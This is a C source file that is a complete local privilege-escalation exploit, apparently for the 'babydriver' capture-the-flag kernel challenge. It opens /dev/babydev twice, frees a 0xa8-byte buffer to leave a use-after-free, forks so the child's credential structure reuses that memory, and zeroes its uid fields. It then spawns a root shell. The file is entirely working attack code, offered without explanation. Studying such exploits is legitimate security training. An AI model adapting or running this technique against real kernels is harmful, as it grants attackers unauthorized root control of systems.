#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <errno.h>

void baby_alloc(int fd, size_t size) {
    ioctl(fd, 0x10001, size);
}

int baby_read(int fd, char* buf, size_t size) {
    return read(fd, buf, size);
}

int baby_write(int fd, char* buf, size_t size) {
    return write(fd, buf, size);
}

void baby_release(int fd) {
    close(fd);
}

int main(int argc, char** argv) {

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        perror("open /dev/babydev failed.");
        exit(-1);
    }

    baby_alloc(fd1, 0xa8);
    baby_release(fd1);
    
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork failed.");
        exit(-1);
    } else if (pid) {
        wait(NULL);
        exit(0);
    } else {
        char buf[28] = {0};

        int bytes_written = baby_write(fd2, (char*)buf, sizeof(buf));
        if (bytes_written != sizeof(buf)) {
            perror("failed to overwrite the cred structure.");
            exit(-1);
        }
        if (getuid()) {
            puts("failed to escalate privilege.");
            exit(-1);
        } else {
            puts("Success, Enjoy Now!!");
            system("/bin/sh");
        }
    }
    return 0;
}